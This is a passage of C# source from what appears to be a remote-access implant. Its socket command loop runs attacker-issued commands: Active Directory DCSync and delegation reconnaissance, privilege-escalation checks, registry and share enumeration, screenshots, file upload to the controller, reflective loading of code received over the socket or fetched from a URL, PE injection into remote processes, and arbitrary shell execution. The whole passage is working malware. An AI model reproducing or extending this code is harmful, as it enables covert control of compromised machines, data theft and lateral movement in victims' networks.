                        DomainCollection domains = f.Domains;
                        cmd = "";
                        foreach(Domain d in domains)
                        {
                            string domainName = d.Name;

                            string[] dcs = domainName.Split('.');
                            for(int i = 0; i < dcs.Length; i++)
                            {
                                dcs[i] = "DC=" + dcs[i];
                            }

                            string domainDN = String.Join(",", dcs);
                            try
                            {
                                Program p = new Program();
                                Thread dcsync = new Thread(() => { cmd += p.GetDCSyncUsers(domainDN); });
                                dcsync.Name = "get-dcsyncusers";
                                dcsync.Start();
                                dcsync.Join();

                            }
                            catch { }


                        }

                        Thread.Sleep(2000);
                    }

                    else if (cmd == "unquotedservices")
                    {

                        Program p = new Program();
                        string sep = @"wmic service get name,pathname | findstr /v /i system32 | findstr /v \`" +'"';
                        Console.WriteLine(sep);
                        cmd = p.GetResult(sep);
                        Console.WriteLine(cmd);
                    
                    }

                    else if (cmd.Contains("getdirectorycontents"))
                    {
                        // getdirectorycontents-directoryname
                       string[] content= cmd.Split('-');
                        string directoryname = content[1];

                        Program p = new Program();
                        Thread dcontents = new Thread(() =>
                        {
                            cmd = p.GetDirectoryContents(directoryname);
                        });
                        dcontents.Start();
                        dcontents.Join();

                        //Thread.Sleep(2000);

                    }

                    else if (cmd.Contains("download-"))
                    {
                        // download->N , we need to upload N number of files
                        string[] files= cmd.Split('-');
                        int nooffiles = Convert.ToInt32(files[1]);
                        Console.WriteLine(nooffiles);
                        string cwd = files[2];
                        Console.WriteLine("Current dir"+cwd);
                        cwd = cwd.Replace(@"\\", @"\");
                        Program p = new Program();

                        Thread uploadnfiles = new Thread(() =>
                        {
                           cmd= p.UploadNFiles(cs, nooffiles,cwd);
                        });
                        uploadnfiles.Start();
                        uploadnfiles.Join();



                    }

                    else if (cmd == "Get-InstalledSoftware")
                    {

                        string programs64 = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
                        string programs32 = @"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall";

                        try
                        {
                            Program p1 = new Program();
                            string softwares1 = "--------64 BIT PROGRAMS-------\n";
                            try
                            {
                                softwares1 += p1.GetSoftware(programs64);
                            }
                            catch { }
                            try
                            {
                                softwares1 += "--------32 BIT PROGRAMS-------\n";
                                softwares1 += p1.GetSoftware(programs32);
                                cmd = softwares1;
                            }
                            catch { }
                            Console.WriteLine(softwares1);
                        }
                        catch { }

                        

                    }


                    else if (cmd.Contains("getregistry-"))
                    {
                        string regpath = "";
                        for(int i = 12; i < cmd.Length; i++)
                        {
                            regpath += cmd[i];
                        }
                        Console.WriteLine(regpath);
                        Program p = new Program();
                        Thread reg = new Thread(() =>
                        {
                           cmd = p.GetRegSubKeysandValues(regpath);
                        });
                        reg.Start();
                        reg.Join();


                    }

                    else if (cmd.Contains("loadfile-"))
                    {
                        // get contents and load 
                        Console.WriteLine("Loading file");
                        byte[] toload = new byte[1024000000];
                        Array.Clear(toload, 0, toload.Length);
                        cs.Receive(toload);

                        Thread loader = new Thread(() =>
                        {
                            Program p1 = new Program();
                            p1.ReflectionLoadFile(toload);
                        });
                        loader.Start();
                        cmd = "Started Loading...";

                    }

                    else if (cmd.Contains("loadurl-"))
                    {
                        // extract url, download data and invoke
                        string url =cmd.Remove(0, 8);
                        Console.WriteLine(url);
                        Thread loadurl = new Thread(() =>
                        {
                            Program p1 = new Program();
                            p1.ReflectionLoadUrl(url);
                        });
                        loadurl.Start();
                        cmd = "Started Loading from url...";
                    }
                    
                    else if (cmd == "Check-ProcessElevation")
                    {

                        IntPtr procHandle = Process.GetCurrentProcess().Handle;
                        IntPtr tokenhandle = IntPtr.Zero;
                        bool res =OpenProcessToken(procHandle, 0x0008, ref tokenhandle);

                        IntPtr tokenelevated = Marshal.AllocHGlobal(4);
                        int elevatedlength = 4;
                        bool res2 =GetTokenInformation(
                            tokenhandle,
                            TOKEN_INFORMATION_CLASS.TokenElevation,
                            tokenelevated,
                            4,
                            ref elevatedlength
                            );

                        TOKEN_ELEVATION te = (TOKEN_ELEVATION)Marshal.PtrToStructure(tokenelevated, typeof(TOKEN_ELEVATION));
                        if (te.TokenIsElevated != 0)
                        {
                            Console.WriteLine(te.TokenIsElevated);
                            cmd = "Have Elevated Privileges";
                        }
                        else
                        {
                            cmd = "Doesnot have elevated privileges";
                        }
                        Console.WriteLine(cmd);
                        //CloseHandle(procHandle);
                        CloseHandle(tokenhandle);
                    }

                    else if (cmd == "ISDEBUGGERPRESENT")
                    {

                        if (IsDebuggerPresent() == true)
                        {
                            cmd = "Debugger is attached";
                        }
                        else
                        {
                            cmd = "No debugger is attached";
                        }

                    }

                    else if (cmd == "Get-UnconstrainedDelegation")
                    {
                        Domain d = Domain.GetCurrentDomain();
                        string domainname = d.Name.ToString();

                        Program p = new Program();
                        cmd = p.GetUnconstrainedDelegation(domainname);

                    }

                    else if (cmd == "Get-Screenshot")
                    {

                        Program p = new Program();
                        cmd = p.GetScreenshot();

                    }

                    else if (cmd == "Get-LogonSessions")
                    {

                       cmd= winapi.Getlogonsessions();
                    }

                    else if (cmd == "Get-GroupsPrivileges")
                    {
                        string computername = Environment.MachineName;
                        // Console.WriteLine(computername);
                        List<string> groups = winapi.GetGroups();
                        
                        foreach (var groupname in groups)
                        {
                            try
                            {
                                cmd += winapi.GetGroupsPrivileges(computername, groupname);
                            }
                            catch { }
                        }
                        
                    }

                    else if (cmd == "Get-NetShares")
                    {
                        try
                        {
                            Console.WriteLine(Environment.MachineName);
                            cmd = winapi.GetNetShares(Environment.MachineName);
                        }
                        catch { }
                    }


                    else if (cmd.Contains("loadpe64-"))
                    {

                        byte[] payload = new byte[102400000];
                        Array.Clear(payload, 0, payload.Length);

                        cs.Receive(payload);

                        try
                        {
                            Thread pe64loader = new Thread(() =>
                            {
                                winapi.InjectPE64(payload);
                            });
                            pe64loader.Start();
                            
                        }
                        catch { }
                        cmd = "Loaded successfully";

                    }

                    else if (cmd.Contains("Get-Processes")) {

                        cmd = GetProcesses();

                    }


                    else if (cmd.Contains("Inject-"))
                    {
                       string[] command = cmd.Split('-');
                        Console.WriteLine(command);
                        //processname,id,mainwindowtitle
                       string pname = command[command.Length - 1];
                        
                        byte[] exe = new byte[102400000];
                        cs.Receive(exe);
                            
                        if (ProcessExist(pname))
                        {
                            cmd = "ProcessExist";

                            int id = Convert.ToInt32(pname.Split(',')[1]);
                            Console.WriteLine(id);
                            UInt32 processallaccess = 0x000F0000 | 0x00100000 | 0xFFFF;

                            IntPtr prochandle = winapi.OpenProcess(processallaccess, false, (uint) id);
                            if (prochandle == IntPtr.Zero)
                            {
                                cmd = "Open Process failed";
                            }
                            else
                            {

                                Thread t = new Thread(() =>
                                {
                                    winapi.RemoteInjectPE64(exe, prochandle);
                                }
                                );
                                t.Start();
                                
                                cmd = "Injected";
                            }


                        }
                        else
                        {
                            cmd = "Processdoesnot exist";
                        }
                    }


                    else
                    {
                        Program p = new Program();

                        cmd = p.GetResult(cmd);
                    }

                    if (cmd == "")
                    {
                        cmd = "Error Occurred";
                    }
                    cs.Send(Encoding.ASCII.GetBytes(cmd));
                    Console.WriteLine("[+] Sent {0}", cmd);
                    Console.WriteLine(cmd.Length.ToString());

                    Array.Clear(buffer, 0, buffer.Length);
                    cs.Receive(buffer);
                }
                cs.Close();
            }
            catch (Exception ee)
            {
                Console.WriteLine(ee.Message);
            }
            // Console.WriteLine("Press any key to continue");
            // Console.ReadKey();
        }
    }
}